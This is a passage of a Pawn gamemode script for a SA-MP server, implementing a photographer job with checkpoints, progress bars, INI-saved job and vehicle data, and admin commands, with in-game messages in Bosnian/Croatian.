 
		                All rights reserved © 2019                            */
 
// a_samp
 
#include < a_samp >
 
//other inc..
 
#include < YSI\y_ini >
#include < Pawn.CMD >
#include < easyDialog >
#include < streamer >
#include < sscanf2 >
#include < progress2 >
#include < a_actor >
 
#include ""map.pwn"" //create_object & remove_object
 
//colors
 
#define col_main 0x0B68F4FF
#define col_2 0x7F95F5DB
#define col_4 0x9180FF8E
 
#define COL_MAIN			""{0B68F4}""
#define COL_WHITE           ""{FFFFFF}""
#define COL_3 				""{7F95F5}""
 
//scripts
 
#define scm SendClientMessage
 
#define error(%0,%1) SendClientMessage(%0, -1, ""{800000}ERROR: {FFFFFF}""%1)
#define command(%0,%1) SendClientMessage(%0, -1, ""{008080}COMMAND: {FFFFFF} ""%1)
#define job(%0,%1) SendClientMessage(%0, -1, ""{FF63B0}JOB: {FFFFFF} ""%1)
 
#define h_dialogshow Dialog_Show
 
#define odaberi "" Odaberi ""
#define odustani "" Odustani ""
#define unesi "" Unes i""
 
#define create_style                    ""{0B68F4}Balkan Gaming - {FFFFFF}Create""
#define job_style                           ""{0B68F4}Photographer - {FFFFFF}Job""
 
 
#define function%0(%1) forward%0(%1); \
					   public%0(%1)
 
#define pressed(%0) \
	(((newkeys & (%0)) == (%0)) && ((oldkeys & (%0)) != (%0)))
 
 
#define KEY_AIM ( 128 )
 
//files
 
#define job_file 												    ""Job/%d.ini""
#define vehicle_file    								    ""Job/Vehicle/%d.ini""
 
//max
 
#define max_job                    /*dont dirat :) */                      ( 2 )
#define max_job_vehicle            /*dont dirat :) */                      ( 6 )
 
#define max_string 													     ( 128 )
 
//enum_job
 
enum job_info {
	Float:jX,
	Float:jY,
	Float:jZ,
	Float:oX,
	Float:oY,
	Float:oZ,
	jKreiran,
	Job_Pickup,
	Oprema_Pickup,
	jSkin,
	jPay,
	jBonus
 
}
 
//enum_vehicle
 
enum vehicle_info {
	veh_id,
	vehicle_id = 589,
	Float:vehicle_X,
	Float:vehicle_Y,
	Float:vehicle_Z,
	Float:vehicle_R
}
 
//variables
 
//enum_variables
 
new Job_Info[ max_job ][ job_info ];
new Vehicle_Info[ max_job_vehicle ][ vehicle_info ];
new Text3D:veh_label[ MAX_PLAYERS ];
new Text3D:job_label[ max_job ];
new job_pickup[ max_job ];
new Text3D:oprema_label[ max_job ];
new oprema_pickup[ max_job ];
 
//player_variables
 
new fotograf[ MAX_PLAYERS ];
new usaovozilo[ MAX_PLAYERS ];
new uzeoopremu[ MAX_PLAYERS ];
new job_cp[ MAX_PLAYERS ];
new slika[ MAX_PLAYERS ];
new edit[ MAX_PLAYERS ];
 
//player_textdraw
 
new PlayerText:job_tde[ MAX_PLAYERS ][ 3 ];
new PlayerBar:job_bar[ MAX_PLAYERS ];
 
//callbacks
 
public OnGameModeInit() {
 
    create_actor();
	// ====================================================================== //
	create_object(); //kreira mapu posla
	// ====================================================================== //
	return 1;
}
 
// ========================================================================== //
 
 
public OnPlayerConnect( playerid ) {
 
	create_pvar( playerid );
	create_job_td( playerid );
	create_bar( playerid );
	// ====================================================================== //
	remove_object( playerid ); //brise nepotrebne objekte
	// ====================================================================== //
	for( new j = 0; j < max_job; j++ ) {
 
        new jFile[ max_string-78 ];
        format( jFile, sizeof( jFile ), job_file, j );
        if( fexist( jFile )) {
 
 			INI_ParseFile( jFile, ""load_job"", .bExtra = true, .extra = j );
 			create_job( j ); create_equipment( j );
		}
	}
	// ====================================================================== //
	for( new v = 0; v < max_job_vehicle; v++ ) {
 
        new vFile[ max_string-78 ];
        format( vFile, sizeof( vFile ), vehicle_file, v );
        if( fexist( vFile )) {
 
 			INI_ParseFile( vFile, ""load_vehicle"", .bExtra = true, .extra = v );
 			create_vehicle( v );
		}
	}
	// ====================================================================== //
	return ( 1 );
}
 
// ========================================================================== //
 
public OnPlayerKeyStateChange( playerid, newkeys, oldkeys ) {
 
    if(pressed(KEY_YES)) {
 
		if( edit[ playerid ] == 1 ) {
 
			h_dialogshow( playerid, equipment_dialog, DIALOG_STYLE_INPUT, job_style, ""Unesite ID job-a za kojeg zelite postaviti mjesto uzimanja opreme"", unesi, odustani );
  		}
	}
	// ====================================================================== //
	if( slika[ playerid ] == 1 ) {
 
		if(pressed(KEY_AIM | KEY_FIRE)) {
 
		    job( playerid, "" Fotografisali ste turistu.. Pratite checkpoint na vasem GPS-u za sljedecu lokaciju "" );
		    slika[ playerid ] = 0;
		    SetPlayerCheckpoint( playerid, 720.7773, -1847.0266, 11.8370, 1.5 );
		    job_cp[ playerid ] = 2;
      		// ============================================================== //
	        new string[ max_string-123 ], value = 15; format( string, sizeof( string ), ""%d%"", value );
            PlayerTextDrawSetString( playerid, job_tde[ playerid ][ 2 ], string );
            SetPlayerProgressBarValue( playerid, job_bar[playerid], value );
            PlayerTextDrawShow( playerid, job_tde[ playerid ][ 2 ] );
            ShowPlayerProgressBar( playerid, job_bar[ playerid ] );
            // ============================================================== //
		}
	}
	// ====================================================================== //
	if( slika[ playerid ] == 2 ) {
 
		if(pressed(KEY_AIM | KEY_FIRE)) {
 
			job( playerid, "" Fotografisali ste San Andreas modela.. Pratite checkpoint na vasem GPS-u za sljedecu lokaciju "" );
		    slika[ playerid ] = 0;
		    SetPlayerCheckpoint( playerid, 1242.9773, -1831.4207, 13.3990, 1.5 );
		    job_cp[ playerid ] = 3;
    		// ============================================================== //
	        new string[ max_string-123 ], value = 30; format( string, sizeof( string ), ""%d%"", value );
            PlayerTextDrawSetString( playerid, job_tde[ playerid ][ 2 ], string );
            SetPlayerProgressBarValue( playerid, job_bar[ playerid ], value );
            PlayerTextDrawShow( playerid, job_tde[ playerid ][ 2 ] );
            ShowPlayerProgressBar( playerid, job_bar[ playerid ] );
            // ============================================================== //
		}
	}
	// ====================================================================== //
	if( slika[ playerid ] == 3 )
	{
		if(pressed(KEY_AIM | KEY_FIRE))
		{
			job( playerid, "" Fotografisali ste Old Timer vehicle.. Pratite checkpoint na vasem GPS-u za sljedecu lokaciju "" );
		    slika[ playerid ] = 0;
		    SetPlayerCheckpoint( playerid, 1196.8201, -2037.0986, 69.0078, 1.5 );
		    job_cp[ playerid ] = 4;
    		// ============================================================== //
	        new string[ max_string-123 ], value = 45; format( string, sizeof( string ), ""%d%"", value );
            PlayerTextDrawSetString( playerid, job_tde[ playerid ][ 2 ], string );
            SetPlayerProgressBarValue( playerid, job_bar[ playerid ], value );
            PlayerTextDrawShow( playerid, job_tde[ playerid ][ 2 ] );
            ShowPlayerProgressBar( playerid, job_bar[ playerid ] );
            // ============================================================== //
		}
	}
	// ====================================================================== //
	if( slika[ playerid ] == 4 ) {
 
		if(pressed(KEY_AIM | KEY_FIRE)) {
 
			job( playerid, "" Fotografisali ste White House.. Pratite checkpoint na vasem GPS-u za sljedecu lokaciju "" );
		    slika[ playerid ] = 0;
		    SetPlayerCheckpoint( playerid, 1890.4421, -1161.0269, 24.1184, 1.5 );
		    job_cp[ playerid ] = 5;
    		// ============================================================== //
	        new string[ max_string-123 ], value = 60; format( string, sizeof( string ), ""%d%"", value );
            PlayerTextDrawSetString( playerid, job_tde[ playerid ][ 2 ], string );
            SetPlayerProgressBarValue( playerid, job_bar[ playerid ], value );
            PlayerTextDrawShow( playerid, job_tde[ playerid ][ 2 ] );
            ShowPlayerProgressBar( playerid, job_bar[ playerid ] );
            // ============================================================== //
		}
	}
	// ====================================================================== //
	if( slika[playerid ] == 5 ) {
 
		if(pressed(KEY_AIM | KEY_FIRE)) {
 
			job( playerid, "" Fotografisali ste Gleen Park.. Pratite checkpoint na vasem GPS-u za sljedecu lokaciju "" );
		    slika[ playerid ] = 0;
		    SetPlayerCheckpoint( playerid, 1374.7612, -951.0601, 34.1875, 1.5 );
		    job_cp[ playerid ] = 6;
    		// ============================================================== //
	        new string[ max_string-123 ], value = 75; format( string, sizeof( string ), ""%d%"", value );
            PlayerTextDrawSetString( playerid, job_tde[ playerid ][ 2 ], string );
            SetPlayerProgressBarValue( playerid, job_bar[ playerid ], value );
            PlayerTextDrawShow( playerid, job_tde[ playerid ][ 2 ] );
            ShowPlayerProgressBar( playerid, job_bar[ playerid ] );
            // ============================================================== //
		}
	}
	// ====================================================================== //
	if( slika[ playerid ] == 6 ) {
 
		if(pressed(KEY_AIM | KEY_FIRE)) {
 
			job( playerid, "" Fotografisali ste Vinewood.. Pratite checkpoint na vasem GPS-u za sljedecu lokaciju "" );
		    slika[ playerid ] = 0;
		    SetPlayerCheckpoint( playerid, 1225.1443,-1697.4547,13.5677, 1.0 );
		    job_cp[ playerid ] = 7;
    		// ============================================================== //
	        new string[ max_string-123 ], value = 95; format( string, sizeof( string ), ""%d%"", value );
            PlayerTextDrawSetString( playerid, job_tde[ playerid ][ 2 ], string );
            SetPlayerProgressBarValue( playerid, job_bar[ playerid ], value );
            PlayerTextDrawShow( playerid, job_tde[ playerid ][ 2 ] );
            ShowPlayerProgressBar( playerid, job_bar[ playerid ] );
            // ============================================================== //
		}
	}
	// ====================================================================== //
    return ( 1 );
}
 
// ========================================================================== //
 
public OnPlayerEnterCheckpoint( playerid ) {
 
	// ====================================================================== //
	if( job_cp[ playerid ] == 1 && GetPlayerState( playerid ) == PLAYER_STATE_ONFOOT ) {
 
	    if( IsPlayerInRangeOfPoint( playerid, 1.5, 550.0431, -1890.8035, 3.4075 )) {
 
	        DisablePlayerCheckpoint( playerid );
			slika[ playerid ] = 1;
			scm( playerid, -1, """"COL_MAIN""(( ""COL_WHITE""Stigli ste na odrediste.. Sada slikajte turistu - 'CAPS LOOK & LCRTL' ""COL_MAIN""))"" );
	    }
	}
	// ====================================================================== //
	if( job_cp[ playerid ] == 2 && GetPlayerState( playerid ) == PLAYER_STATE_ONFOOT ) {
 
	    if( IsPlayerInRangeOfPoint( playerid, 1.5, 720.7773, -1847.0266, 11.8370 )) {
	        DisablePlayerCheckpoint( playerid );
			slika[ playerid ] = 2;
			scm( playerid, -1, """"COL_MAIN""(( ""COL_WHITE""Stigli ste na odrediste.. Sada slikajte San Andreas modela - 'CAPS LOOK & LCRTL' ""COL_MAIN""))"" );
	    }
	}
	// ====================================================================== //
	if( job_cp[ playerid ] == 3 && GetPlayerState( playerid ) == PLAYER_STATE_ONFOOT ) {
 
	    if( IsPlayerInRangeOfPoint( playerid, 1.5, 1242.9773, -1831.4207, 13.3990 )) {
 
	        DisablePlayerCheckpoint( playerid );
			slika[ playerid ] = 3;
			scm( playerid, -1, """"COL_MAIN""(( ""COL_WHITE""Stigli ste na odrediste.. Sada slikajte Old Timer vehicle - 'CAPS LOOK & LCRTL' ""COL_MAIN""))"" );
	    }
	}
	// ====================================================================== //
	if(job_cp[ playerid ] == 4 && GetPlayerState( playerid ) == PLAYER_STATE_ONFOOT ) {
 
	    if( IsPlayerInRangeOfPoint( playerid, 1.5, 1196.8201, -2037.0986, 69.0078 )) {
 
	        DisablePlayerCheckpoint( playerid );
			slika[ playerid ] = 4;
			scm( playerid, -1, """"COL_MAIN""(( ""COL_WHITE""Stigli ste na odrediste.. Sada slikajte White House - 'CAPS LOOK & LCRTL' ""COL_MAIN""))"" );
	    }
	}
	// ====================================================================== //
	if( job_cp[ playerid ] == 5 && GetPlayerState( playerid ) == PLAYER_STATE_ONFOOT ) {
 
	    if( IsPlayerInRangeOfPoint( playerid, 1.5, 1890.4421, -1161.0269, 24.1184 )) {
 
	        DisablePlayerCheckpoint( playerid );
			slika[ playerid ] = 5;
			scm( playerid, -1, """"COL_MAIN""(( ""COL_WHITE""Stigli ste na odrediste.. Sada slikajte Gleen Park - 'CAPS LOOK & LCRTL' ""COL_MAIN""))"" );
	    }
	}
	// ====================================================================== //
	if(job_cp[ playerid ] == 6 && GetPlayerState( playerid ) == PLAYER_STATE_ONFOOT ) {
 
	    if( IsPlayerInRangeOfPoint( playerid, 1.5, 1374.7612, -951.0601, 34.1875 )) {
 
	        DisablePlayerCheckpoint( playerid );
			slika[ playerid ] = 6;
			scm( playerid, -1, """"COL_MAIN""(( ""COL_WHITE""Stigli ste na odrediste.. Sada slikajte Vinewood - 'CAPS LOOK & LCRTL' ""COL_MAIN""))"" );
	    }
	}
	// ====================================================================== //
	if( job_cp[ playerid ] == 7 && GetPlayerState( playerid ) == PLAYER_STATE_ONFOOT ) {
 
	    if( IsPlayerInRangeOfPoint( playerid, 1.0, 1225.1443,-1697.4547,13.5677 )) {
 
	        new jfile[ max_string-48 ], hr = ( 1 );
	        format( jfile, sizeof( jfile ), job_file, hr );
	        DisablePlayerCheckpoint( playerid );
			job( playerid, ""Cestitamo. Uspjesno ste odradili posao."" );
			new job_string[ max_string-88 ]; format( job_string, sizeof( job_string ), ""~r~Good job~n~~w~%d+bonus:%d"", Job_Info[ hr ][ jPay ], Job_Info[ hr ][ jBonus ] );
			GameTextForPlayer( playerid, job_string, 8000, 1 );
			job_cp[ playerid ] = 0; slika[ playerid ] = 0; uzeoopremu[ playerid ] = 0;
			ResetPlayerWeapons( playerid );
			GivePlayerMoney( playerid, Job_Info[ hr ][ jPay ]+Job_Info[ hr ][ jBonus ] );
			SetPlayerSkin( playerid, 101 );
 			// ============================================================== //
			DestroyPlayerProgressBar( playerid, job_bar[ playerid ] );
			// ============================================================== //
 			for( new i = 0; i < 3; i++ ) {
 
            	PlayerTextDrawHide( playerid, job_tde[ playerid ][ i ] );
		 	}
            // ============================================================== //
	    }
	}
	// ====================================================================== //
	return ( 1 );
}
 
//commands
 
cmd:skin(playerid, params[]) {
 
	SetPlayerSkin(playerid, 101);
}
 
cmd:portjob( playerid, params[] ) {
 
	SetPlayerPos( playerid, 1252.0038, -1711.8047, 13.2577 );
	return ( 1 ); 
}
 
cmd:createjob( playerid, params[] ) {
 
	if( !IsPlayerAdmin( playerid )) return error( playerid, ""Morate biti ulogovani kao RCON administrator"" ); {
 
		// ================================================================== //
		new job_id = Next_Job(), job_skin, job_pay, Float:pos[ 3 ], job_string[ max_string ];
  		// ================================================================== //
	    if( job_id < 1 || job_id >= max_job ) return error( playerid, ""Vec ste kreirali posao ili ste dostigli limit kreiranja posla."" ); {
 
	    	if( sscanf( params, ""ii"", job_skin, job_pay )) {
 
	        	scm( playerid, -1, ""____________________________________________"" );
	        	scm( playerid, -1, """" );
	        	command( playerid, ""/createjob { job_skin } { job_pay }"" );
	        	scm( playerid, -1, ""____________________________________________"" );
	        	return ( 1 );
	    	}
			// ================================================================== //
			GetPlayerPos( playerid, pos[0], pos[1], pos[2] );
	    	// ================================================================== //
     		Job_Info[ job_id ][ jX ] = pos[ 0 ];
	    	Job_Info[ job_id ][ jY ] = pos[ 1 ];
	    	Job_Info[ job_id ][ jZ ] = pos[ 2 ];
	    	Job_Info[ job_id ][ Job_Pickup ] = 1210;
	    	Job_Info[ job_id ][ jKreiran ] = 1;
	    	Job_Info[ job_id ][ jSkin ] = job_skin;
	    	Job_Info[ job_id ][ jPay ] = job_pay;
	    	// =============================================================== //
	    	edit[ playerid ] = 1;
	    	// ================================================================== //
	    	create_job( job_id );
	    	// ================================================================== //
			format( job_string, sizeof( job_string ), """"COL_3""* Uspjesno ste kreirali posao ""COL_WHITE""ID: %d""COL_3"", sada kreirajte mjesto za uzimanje opreme ""COL_WHITE""'Y' ""COL_3""*"", job_id );
			scm( playerid,  -1, job_string );
	    	// ================================================================== //
	    	Save_Job( job_id ); //saving job
	    	// ================================================================== //
	    }
	}
	return ( 1 );
}
 
alias:createjob( ""kreirajposao"" );
 
// ========================================================================== //
 
cmd:getjob( playerid, params[] ) {
 
	if( fotograf[ playerid ] == 1 ) return error( playerid, ""Vec si zaposlen kao fotograf"" ); {
 
	    // ================================================================== //
	    new jFile[ max_string-78 ], hr = ( 1 );
	    format( jFile, sizeof( jFile ), job_file, hr ); {
 
	    	if( !IsPlayerInRangeOfPoint( playerid, 1.5, Job_Info[ hr ][ jX ], Job_Info[ hr ][ jY ], Job_Info[ hr ][ jZ ] )) return error( playerid, ""Niste na mjestu za zaposljenje"" ); {
				new dialog_string[ max_string ];
				format( dialog_string, sizeof( dialog_string ), """"COL_WHITE""\nDa li ste sigurni da se zelite zaposliti kao fotograf?\n""COL_3""Plata: ""COL_WHITE""%d$ + bonus"", Job_Info[ hr ][ jPay ] );
				h_dialogshow( playerid, job_menu, DIALOG_STYLE_MSGBOX, job_style, dialog_string, odaberi, odustani );
			}
		}
	}
	return ( 1 );
}
 
alias:getjob( ""zaposlise"" );
 
// ========================================================================== //
 
cmd:oprema( playerid, params[] ) {
 
	// ====================================================================== //
	new jFile[ max_string-88 ], hr = ( 1 );
	format( jFile, sizeof( jFile ), job_file, hr ); {
 
	    if( !IsPlayerInRangeOfPoint( playerid, 1.5, Job_Info[ hr ][ oX ], Job_Info[ hr ][ oY ], Job_Info[ hr ][ oZ ] )) return error( playerid, ""Niste na mjestu za uzimanje opreme!"" ); {
 
	        if( fotograf[ playerid ] == 1 ) {
 
	            // ========================================================== //
	            GivePlayerWeapon( playerid, 43, 15 );
	            // ========================================================== //
	            SetPlayerSkin( playerid, Job_Info[ hr ][ jSkin ] );
				// ========================================================== //
	            scm( playerid, col_2, ""* Uzeli ste opremu ( Canon 70D i potrebne objektive ) .. Sada pokrenite posao komandom /job *"" );
	            // ========================================================== //
	            uzeoopremu[ playerid ] = 1;
	            // ========================================================== //
	        }
	    }
	}
	return ( 1 );
}
 
alias:oprema( ""equipment"" );
 
// ========================================================================== //
 
cmd:job( playerid, params[] ) {
 
	if( fotograf[ playerid ] != 1 ) return error( playerid, ""Niste zaposljeni kao fotograf"" ); {
 
	    if( uzeoopremu[ playerid ] != 1 ) return error( playerid, ""Ne mozes raditi posao dok ne uzmes opremu"" ); {
 
	        // ============================================================== //
	        new string[ max_string-123 ], value = 0; format( string, sizeof( string ), ""%d%"", value );
            PlayerTextDrawSetString( playerid, job_tde[ playerid ][ 2 ], string );
            SetPlayerProgressBarValue( playerid, job_bar[ playerid ], value );
            ShowPlayerProgressBar( playerid, job_bar[ playerid ] );
            // ============================================================== //
    		for( new i = 0; i < 3; i++ ) {
 
            	PlayerTextDrawShow( playerid, job_tde[ playerid ][ i ] );
		 	}
	        // ============================================================== //
	        SetPlayerCheckpoint( playerid, 550.0431, -1890.8035, 3.4075, 1.5 );
	        job( playerid, ""* Pokrenuo si posao. Prati checkpoint na vasem GPS-u *"" );
	        job_cp[ playerid ]  = 1;
	    }
	}
	return ( 1 );
}
 
alias:job( ""posao"" );
 
// ========================================================================== //
 
cmd:createvehicle( playerid, params[] ) {
 
	if( !IsPlayerAdmin( playerid )) return error( playerid, ""Morate biti ulogovani kao RCON administrator"" ); {
 
		// ================================================================== //
		new Vehicle_ID = Next_Vehicle(), Float:veh_pos[ 3 ], string[ max_string ];
  		// ================================================================== //
	    if( Vehicle_ID < 1 || Vehicle_ID >= max_job_vehicle ) return error( playerid, ""Dostigli ste limit kreiranja vozila."" ); {
 
			// ====================================================== //
   			GetPlayerPos( playerid, veh_pos[ 0 ], veh_pos[ 1 ], veh_pos[ 2 ] );
   			// ====================================================== //
      		Vehicle_Info[ Vehicle_ID ][ vehicle_id ] = vehicle_id;
        	Vehicle_Info[ Vehicle_ID ][ vehicle_X ] = veh_pos[ 0 ];
         	Vehicle_Info[ Vehicle_ID ][ vehicle_Y ] = veh_pos[ 1 ];
          	Vehicle_Info[ Vehicle_ID ][ vehicle_Z ] = veh_pos[ 2 ];
           	Vehicle_Info[ Vehicle_ID ][ veh_id ] = Vehicle_ID;
           	// ====================================================== //
            Save_Vehicle( Vehicle_ID );
            // ====================================================== //
            create_vehicle( Vehicle_ID );
            // ====================================================== //
            format( string, sizeof( string ), """"COL_3""Uspjesno ste kreirali vozilo ""COL_WHITE""ID: %d || VEH_ID: %d ""COL_3""za posao fotografa."", Vehicle_ID, vehicle_id ); scm( playerid, -1, string );
            // ====================================================== //
 
		}
	}
	return ( 1 );
}
 
alias:createvehicle( ""kreirajvozilo"" );
 
// ========================================================================== //
 
cmd:editjob( playerid, params[] ) {
 
	if( !IsPlayerAdmin( playerid )) return error( playerid, ""Morate biti ulogovani kao RCON administrator"" ); {
 
		h_dialogshow( playerid, job_edit, DIALOG_STYLE_LIST, job_style, ""Job_Position\nJob_Pickup\nJob_Skin\nJob_Pay\nJob_Bonus\nOprema_Position\nOprema_Pickup\nVehicle_Park"", odaberi, odustani );
	}
	return ( 1 );
}
 
alias:editjob( ""editposao"" );
 
// ========================================================================== //
 
cmd:delete( playerid, params[] ) {
 
	if( !IsPlayerAdmin( playerid )) return error( playerid, ""Morate biti ulogovani kao RCON administrator"" ); {
 
		new delete_type, delete_id, dFile[ max_string-68 ], d_string[ max_string-58 ];
		if( sscanf( params, ""ii"", delete_type, delete_id )) {
 
			scm(  playerid, -1, ""_______________________________________________"" );
			scm( playerid, -1, """" );
			command( playerid, ""/delete { delete_type }, { delete_id }"" );
			scm( playerid, -1, ""DELETE_TYPE: 1.job - 2.vehicle"" );
			scm( playerid, -1, ""________________________________________________"");
			return ( 1 );
		}
		if( delete_type == 1 ) {
 
			format( dFile, sizeof(dFile), job_file, delete_id ); {
 
				if( Job_Info[ delete_id ][ jKreiran ] == 1 ) {
 
					if( !fexist( dFile )) return error( playerid, ""ID tog job-aa ne postoji!"" ); {
 
						fremove( dFile );
						// ================================================== //
						DestroyDynamicPickup( job_pickup[ delete_id ] ); DestroyDynamicPickup( oprema_pickup[ delete_id ] );
						// ================================================== //
						Delete3DTextLabel( job_label[ delete_id ] ); Delete3DTextLabel( oprema_label[ delete_id ] );
						// ================================================== //
						format( d_string, sizeof( d_string ), """"COL_3""* Usjesno ste obrisali ""COL_WHITE""job_id: %d ""COL_3""*"", delete_id ); scm( playerid, -1, d_string );
					}
 
				}
			}
 
		}
		else if( delete_type == 2) {
 
			format( dFile, sizeof( dFile ), vehicle_file, delete_id ); {
 
				// ========================================================== //
				if( !fexist( dFile )) error( playerid, ""ID tog vozila ne postoji!"" ); {
 
					fremove( dFile );
					// ========================================================== //
					new veeh_id = GetPlayerVehicleID( playerid );
					// ========================================================== //
					DestroyVehicle( veeh_id );
					// ========================================================== //
					Delete3DTextLabel( veh_label[ delete_id ] );
					// ========================================================== //
					format( d_string, sizeof( d_string ), """"COL_3""* Uspjesno ste obrisali ""COL_WHITE""vehicle_id %d ""COL_3""*"", delete_id ); scm( playerid, -1, d_string );
				}
			}
		}
 
	}
	return ( 1 );
}
 
//stocks
 
stock Next_Job() {
 
    new id = -1;
    for( new loop = ( 0 ), provjera = ( -1 ), Data_[ 64 ] = ""\0""; loop != max_job; ++ loop ) {
 
       provjera = ( loop + 1 );
       format( Data_, ( sizeof Data_ ), job_file, provjera );
       if( !fexist( Data_ )) {
 
          id = ( provjera );
          break;
       }
   	}
  	return id;
}
 
// ========================================================================== //
 
stock Next_Vehicle() {
 
    new id = -1;
    for( new loop = ( 0 ), provjera = ( -1 ), Data_[ 64 ] = ""\0""; loop != max_job_vehicle; ++ loop ) {
 
       provjera = ( loop + 1 );
       format( Data_, ( sizeof Data_ ), vehicle_file, provjera );
       if( !fexist( Data_ )) {
 
          id = ( provjera );
          break;
       }
   	}
  	return id;
}
 
// ========================================================================== //
 
stock Save_Job( job_id ) {
 
	new jFile[ max_string ];
	format( jFile, sizeof( jFile ), job_file, job_id );
	new INI:File = INI_Open( jFile );
	INI_WriteFloat( File,""job_X"", Job_Info[ job_id ][ jX ] );
    INI_WriteFloat( File,""job_Y"", Job_Info[ job_id ][ jY ] );
    INI_WriteFloat( File,""job_Z"", Job_Info[ job_id ][ jZ ] );
   	INI_WriteFloat( File,""oprema_X"", Job_Info[ job_id ][ oX ] );
    INI_WriteFloat( File,""oprema_Y"", Job_Info[ job_id ][ oY ] );
    INI_WriteFloat( File,""oprema_Z"", Job_Info[ job_id ][ oZ ] );
    INI_WriteInt( File,""Job_Pickup"", Job_Info[ job_id ][ Job_Pickup ] );
    INI_WriteInt( File,""Oprema_Pickup"", Job_Info[ job_id ][ Oprema_Pickup ] );
    INI_WriteInt( File,""Pay"", Job_Info[ job_id ][ jPay ] );
    INI_WriteInt( File,""Bonus"", Job_Info[ job_id ][ jBonus ] );
    INI_WriteInt( File,""Skin"", Job_Info[ job_id ][ jSkin ] );
    INI_WriteInt( File,""Kreiran"", Job_Info[ job_id ][ jKreiran ] );
    INI_Close( File );
	return ( 1 );
}
 
// ========================================================================== //
 
stock Save_Vehicle( v_id ) {
 
	new vFile[ max_string ];
	format( vFile, sizeof( vFile ), vehicle_file, v_id );
	new INI:File = INI_Open( vFile );
   	INI_WriteFloat( File,""vehicle_X"", Vehicle_Info[ v_id ][ vehicle_X ] );
    INI_WriteFloat( File,""vehicle_Y"", Vehicle_Info[ v_id ][ vehicle_Y ] );
    INI_WriteFloat( File,""vehicle_Z"", Vehicle_Info[ v_id ][ vehicle_Z ] );
    INI_WriteFloat( File,""vehicle_R"", Vehicle_Info[ v_id ][ vehicle_R ] );
    INI_WriteInt( File,""Vehicle_ID"", Vehicle_Info[ v_id ][ vehicle_id ] );
    INI_WriteInt( File,""v_ID"", Vehicle_Info[ v_id ][ veh_id ] );
    INI_Close( File );
	return ( 1 );
}
 
// ========================================================================== //
 
stock create_actor() {
 
	// ====================================================================== //
	new actor_id[ 4 ], actor_string[ max_string-78 ], actor_string_2[ max_string-78 ];
	// ====================================================================== //
	actor_id[ 1 ] = CreateDynamicActor( 26, 546.7336, -1896.5516, 2.8872, 310.3488, 1 ); 
    // ====================================================================== //
	format( actor_string, sizeof( actor_string ), """"COL_3""[ TURIST ]\n""COL_WHITE""HrustanoviK"" );
	CreateDynamic3DTextLabel( actor_string, 0x1D9F00AA, 546.7336, -1896.5516, 2.8872+1,10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0, -1 );
	// ====================================================================== //
	actor_id[ 2 ] = CreateDynamicActor( 56, 721.4601, -1855.2256, 11.2961, 323.0295, 1 ); 
	// ====================================================================== //
	format( actor_string_2, sizeof( actor_string_2 ), """"COL_3""[ MODEL ]\n""COL_WHITE""Michelle_Cannes"" );
	CreateDynamic3DTextLabel( actor_string_2, 0x1D9F00AA, 721.4601, -1855.2256, 11.2961+1,10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0, -1 );
	// ====================================================================== //
	actor_id[ 3 ] = CreateDynamicActor( 13, 1226.7090, -1699.7235, 13.5677, 26.9832, 1);
	// ====================================================================== //
	return ( 1 );
}
 
// ========================================================================== //
 
stock create_job( job_id ) {
 
	if( Job_Info[ job_id ][ jKreiran ] == 1 ) {
 
		job_pickup[ job_id ] = CreateDynamicPickup( Job_Info[ job_id ][ Job_Pickup ], 1, Job_Info[ job_id ][ jX ], Job_Info[ job_id ][ jY ], Job_Info[ job_id ][ jZ ], -1 );
  		//  ============================================================= //
    	new s_label[ max_string ], job_name[ max_string-108 ] = ""Photographer job""; format( s_label, sizeof( s_label ), """"COL_3""(( ""COL_WHITE""%s ""COL_3""))\n\n""COL_WHITE""Da se zaposlite koristite ""COL_3""/getjob"", job_name );
     	job_label[ job_id ] = Create3DTextLabel( s_label, 0x1D9F00AA, Job_Info[ job_id ][ jX ], Job_Info[ job_id ][ jY ], Job_Info[ job_id ][ jZ ], 8.0, 0, 0 );
	}
}
 
// ========================================================================== //
 
stock create_equipment( equipment_id ) {
 
	if( Job_Info[ equipment_id ][ jKreiran ] == 1 ) {
 
		oprema_pickup[ equipment_id ] = CreateDynamicPickup( Job_Info[ equipment_id ][ Oprema_Pickup ], 1, Job_Info[ equipment_id ][ oX ], Job_Info[ equipment_id ][ oY ], Job_Info[ equipment_id ][ oZ ], -1 );
  		//  ============================================================= //
    	new s_label[ max_string ], job_name[ max_string-108 ] = ""Photographer job""; format( s_label, sizeof( s_label ), """"COL_3""(( ""COL_WHITE""%s ""COL_3""))\n\n""COL_WHITE""Da uzmete opremu koristite ""COL_3""/oprema"", job_name );
     	oprema_label[ equipment_id ] = Create3DTextLabel( s_label, 0x1D9F00AA, Job_Info[ equipment_id ][ oX ], Job_Info[ equipment_id ][ oY ], Job_Info[ equipment_id ][ oZ ], 8.0, 0, 0 );
	}
}
 
// ========================================================================== //
 
stock create_vehicle( v_id ) {
 
    new h_veh = CreateVehicle( Vehicle_Info[ v_id ][ vehicle_id ], Vehicle_Info[ v_id ][ vehicle_X ], Vehicle_Info[ v_id ][ vehicle_Y ], Vehicle_Info[ v_id ][ vehicle_Z ], Vehicle_Info[ v_id ][ vehicle_R ], 0, 0, 2400, 0 );
    // ====================================================== //
	new veh_string[ max_string-58 ]; format( veh_string, sizeof( veh_string ), """"COL_MAIN""(( ""COL_WHITE""Photographer vehicle: %d ""COL_MAIN""))"", Vehicle_Info[ v_id ][ veh_id ] );
	veh_label[ v_id ] = Create3DTextLabel( veh_string, 0x1D9F00AA, 0.0, 0.0, 0.0, 20.0, 0, 0 );
	Attach3DTextLabelToVehicle( veh_label[ v_id ], h_veh, 0.0, 0.0, 0.0 );
}
 
// ========================================================================== //
 
stock create_job_td( playerid ) {
 
    job_tde[ playerid ][ 0 ] = CreatePlayerTextDraw( playerid, 150.380432, 426.350280, ""PHOTOGRAPHER_JOB"" );
	PlayerTextDrawLetterSize( playerid, job_tde[ playerid ][ 0 ], 0.179001, 0.800000 );
	PlayerTextDrawAlignment( playerid, job_tde[ playerid ][ 0 ], 1 );
	PlayerTextDrawColor( playerid, job_tde[ playerid ][ 0 ], -1 );
	PlayerTextDrawSetShadow( playerid, job_tde[ playerid] [ 0 ], 0 );
	PlayerTextDrawSetOutline( playerid, job_tde[ playerid ][ 0 ], 1 );
	PlayerTextDrawBackgroundColor( playerid, job_tde[ playerid ][ 0 ], 255 );
	PlayerTextDrawFont( playerid, job_tde[playerid][ 0 ], 2) ;
	PlayerTextDrawSetProportional( playerid, job_tde[ playerid ][ 0 ], 1 );
